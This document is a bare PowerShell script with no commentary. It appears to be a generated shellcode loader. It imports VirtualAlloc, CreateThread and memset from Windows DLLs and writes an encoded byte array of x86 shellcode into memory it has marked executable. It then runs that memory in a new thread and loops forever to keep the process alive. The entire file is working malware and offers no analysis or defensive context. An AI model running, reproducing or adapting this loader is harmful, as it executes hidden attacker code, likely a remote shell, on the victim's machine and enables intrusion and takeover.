
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd8,0xb8,0x75,0x49,0x93,0x61,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xed,0x89,0xab,0x66,0x9d,0x99,0xae,0x89,0x5e,0x59,0xcf,0x00,0xbb,0x68,0xcf,0x77,0xcf,0xda,0xff,0xfc,0x9d,0xd6,0x74,0x50,0x36,0x6d,0xf8,0x7d,0x39,0xc6,0xb7,0x5b,0x74,0xd7,0xe4,0x98,0x17,0x5b,0xf7,0xcc,0xf7,0x62,0x38,0x01,0xf9,0xa3,0x25,0xe8,0xab,0x7c,0x21,0x5f,0x5c,0x09,0x7f,0x5c,0xd7,0x41,0x91,0xe4,0x04,0x11,0x90,0xc5,0x9a,0x2a,0xcb,0xc5,0x1d,0xff,0x67,0x4c,0x06,0x1c,0x4d,0x06,0xbd,0xd6,0x39,0x99,0x17,0x27,0xc1,0x36,0x56,0x88,0x30,0x46,0x9e,0x2e,0xab,0x3d,0xd6,0x4d,0x56,0x46,0x2d,0x2c,0x8c,0xc3,0xb6,0x96,0x47,0x73,0x13,0x27,0x8b,0xe2,0xd0,0x2b,0x60,0x60,0xbe,0x2f,0x77,0xa5,0xb4,0x4b,0xfc,0x48,0x1b,0xda,0x46,0x6f,0xbf,0x87,0x1d,0x0e,0xe6,0x6d,0xf3,0x2f,0xf8,0xce,0xac,0x95,0x72,0xe2,0xb9,0xa7,0xd8,0x6a,0x0d,0x8a,0xe2,0x6a,0x19,0x9d,0x91,0x58,0x86,0x35,0x3e,0xd0,0x4f,0x90,0xb9,0x17,0x7a,0x64,0x55,0xe6,0x85,0x95,0x7f,0x2c,0xd1,0xc5,0x17,0x85,0x5a,0x8e,0xe7,0x2a,0x8f,0x01,0xb8,0x84,0x60,0xe2,0x68,0x64,0xd1,0x8a,0x62,0x6b,0x0e,0xaa,0x8c,0xa6,0x27,0x41,0x76,0x20,0x3d,0x95,0xe2,0xc1,0xd5,0x9b,0x12,0x30,0x7a,0x15,0xf4,0x58,0x92,0x73,0xae,0xf4,0x0b,0xde,0x24,0x65,0xd3,0xf4,0x40,0xa5,0x5f,0xfb,0xb5,0x6b,0xa8,0x76,0xa6,0x1b,0x58,0xcd,0x94,0x8d,0x67,0xfb,0xb3,0x31,0xf2,0x00,0x12,0x66,0x6a,0x0b,0x43,0x40,0x35,0xf4,0xa6,0xdb,0xfc,0x60,0x09,0xb3,0x00,0x65,0x89,0x43,0x57,0xef,0x89,0x2b,0x0f,0x4b,0xda,0x4e,0x50,0x46,0x4e,0xc3,0xc5,0x69,0x27,0xb0,0x4e,0x02,0xc5,0xef,0xb9,0x8d,0x36,0xda,0x3b,0xf1,0xe0,0x22,0x4e,0x1b,0x31;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

